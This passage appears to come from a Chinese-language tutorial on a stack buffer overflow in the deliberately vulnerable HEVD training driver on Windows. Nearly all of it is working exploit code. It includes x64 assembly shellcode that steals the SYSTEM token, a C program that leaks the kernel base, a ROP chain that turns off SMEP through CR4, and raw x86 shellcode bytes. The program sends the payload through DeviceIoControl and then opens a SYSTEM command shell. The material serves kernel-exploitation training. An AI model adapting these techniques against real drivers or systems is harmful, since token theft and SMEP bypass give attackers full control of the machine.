即irp在rsp上方偏移58h处（也没有被覆盖）
由于irp的存在rbx中，所以需要执行mov rbx, [rsp+58h]来恢复irp。
最后shellcode为
    ;for  win8  x64
    .code
    shellCode proc
    ; shellcode
    mov rax, gs:[188h]    ;Kprcb.Kpthread
    mov rax, [rax+220h]    ;process
    mov    rcx, rax    ; keep copy value
    mov    rdx, 4        ; system PID
    findSystemPid:
        mov    rax, [rax+2e8h]    ; ActiveProcessLinks : _LIST_ENTRY
        sub    rax, 2e8h
        cmp    [rax+2e0h], rdx
        jnz findSystemPid
        ; 替换Token
        mov rdx, [rax+348h]    ; get system token
        mov [rcx+348h], rdx    ; copy
        ;根据实际环境调整
       mov rbx, [rsp+58h]    ;restore IRP
       add     rsp,10h
        ;xor rax, rax  ;NTSTATUS Status = STATUS_SUCCESS
        ret
    shellCode endp
    end
（构造shellcode时，要根据具体情况调整代码）
结果如下：
附代码：(shellcode在shellCode.asm文件中)：
    #include 
    #include 
    #include 
    #include 
    #include "shellCode.h"
    /*
    HEVD Windows Driver Exploit for the Stack Buffer Overflow
    */
    #ifdef _WIN64
        #define RETLEN 8
        #define JUNK_SIZE       2056
        #define TOAL_SIZE       JUNK_SIZE + 8*4
        //gadgets1(pop rcx  ret) + 406f8 + gadgets2(mov cr4,crx  ret) + shellcodeAddr
    #else
        #define RETLEN 4
        #define JUNK_SIZE       2080
        #define TOAL_SIZE       2080 + 8
    #endif
    #define SHELLCODE_LEN   61
    #define STACK_IOCTL     0x222003
    #define DRIVER_PATH     "\\\\.\\HackSysExtremeVulnerableDriver"
    //对应的函数名声明在shellCode文件中;
    //win x64 不支持嵌入式汇编，需要单独存放;
    extern "C" void shellCode();
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemModuleInformation = 11,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG NumberOfModules;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
    typedef struct _ROP {
        PUCHAR PopRcxRet;
        PUCHAR Cr4RegValue;
        PUCHAR MovCr4EcxRet;
    } ROP, *PROP;
    typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );
    __int64* GetKernelBase()
    {
        DWORD len;
        PSYSTEM_MODULE_INFORMATION ModuleInfo;
        __int64 *kernelBase = NULL;
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
            GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
        if (NtQuerySystemInformation == NULL) {
            return NULL;
        }
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
        ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!ModuleInfo)
        {
            return NULL;
        }
        NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
        kernelBase = (__int64*)ModuleInfo->Module[0].ImageBase;
        VirtualFree(ModuleInfo, 0, MEM_RELEASE);
        return kernelBase;
    }
    void main() {
        LPVOID uBuffer = VirtualAlloc(NULL,
            TOAL_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (!uBuffer) {
            printf("Error allocating the user buffer\n");
            exit(1);
        }
        char payload[TOAL_SIZE] = { 0 };
        char junk_pay[JUNK_SIZE] = { 'A' };
        memset(junk_pay, 'A', JUNK_SIZE);
        memcpy(payload, junk_pay, JUNK_SIZE);
    #ifdef _WIN64
        __int64 pKernelAddr = (__int64)GetKernelBase();
        printf("KernelAddr = %I64x\n", pKernelAddr);
        *((__int64*)((char*)payload + JUNK_SIZE)) = (__int64)(pKernelAddr + 0x7db64);   //pop rcx   ret
        *((__int64*)((char*)payload + JUNK_SIZE + 8)) = 0x406f8;
        *((__int64*)((char*)payload + JUNK_SIZE + 8 + 8)) = (__int64)(pKernelAddr + 0x8655A);    //mov cr4 rcx , ret
        *((__int64*)((char*)payload + JUNK_SIZE + 8 + 8 +8)) = (__int64)shellCode;
    #else
        char shellcode[] =
            /* --- Setup --- */
            "\x60"                        // pushad
            "\x64\xA1\x24\x01\x00\x00"    // mov eax, fs:[KTHREAD_OFFSET]
            "\x8B\x40\x50"                // mov eax, [eax + EPROCESS_OFFSET]
            "\x89\xC1"                    // mov ecx, eax (Current _EPROCESS structure)
            "\x8B\x98\xF8\x00\x00\x00"    // mov ebx, [eax + TOKEN_OFFSET]
                                          /* --- Copy System token */
            "\xBA\x04\x00\x00\x00"        // mov edx, 4 (SYSTEM PID)
            "\x8B\x80\xB8\x00\x00\x00"    // mov eax, [eax + FLINK_OFFSET]
            "\x2D\xB8\x00\x00\x00"        // sub eax, FLINK_OFFSET
            "\x39\x90\xB4\x00\x00\x00"    // cmp [eax + PID_OFFSET], edx
            "\x75\xED"                    // jnz
            "\x8B\x90\xF8\x00\x00\x00"    // mov edx, [eax + TOKEN_OFFSET]
            "\x89\x91\xF8\x00\x00\x00"    // mov [ecx + TOKEN_OFFSET], edx
                                          /* --- Cleanup --- */
            "\x61"                        // popad
            "\x31\xC0"                    // NTSTATUS -> STATUS_SUCCESS
            "\x5D"                        // pop ebp
            "\xC2\x08\x00";               // ret 8
        // Set the DeleteProcedure to the address of our payload
        int shellcode_len = sizeof(shellcode);
        __int64 *pShellcodeBuf = (__int64*)VirtualAlloc(NULL, shellcode_len, MEM_RESERVE| MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        RtlMoveMemory(pShellcodeBuf, shellcode, shellcode_len);
        printf("ShellcodeBuf = %I64x\n", pShellcodeBuf);
        *((int*)((char*)payload + JUNK_SIZE)) = (int)pShellcodeBuf;
    #endif
        RtlCopyMemory(uBuffer, payload, TOAL_SIZE);
        HANDLE device = CreateFileA(DRIVER_PATH,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            NULL);
        if (device == INVALID_HANDLE_VALUE) {
            printf("[!] Error opening the driver\n");
            exit(1);
        }
        DWORD bytesRet;
        BOOL bof = DeviceIoControl(device,          /* handler for open driver */
            STACK_IOCTL,     /* IOCTL for the stack overflow */
            uBuffer,         /* our user buffer with shellcode/retAddr */
            TOAL_SIZE,
            NULL,            /* no buffer for the driver to write back to */
            0,               /* above buffer of size 0 */
            //&bytesRet,       /* dump variable for byte returned */
            NULL,
            NULL);           /* ignore overlap */
                             /* check if the device IO sent fine! */
        if (!bof) {
            printf("[!] Error with DeviceIoControl: %d\n", GetLastError());
            //exit(1);
        }
        else {
            printf("[*] Success!! Enjoy your shell!\n");
        }
        /* pop a shell! */
        system("cmd.exe");
    }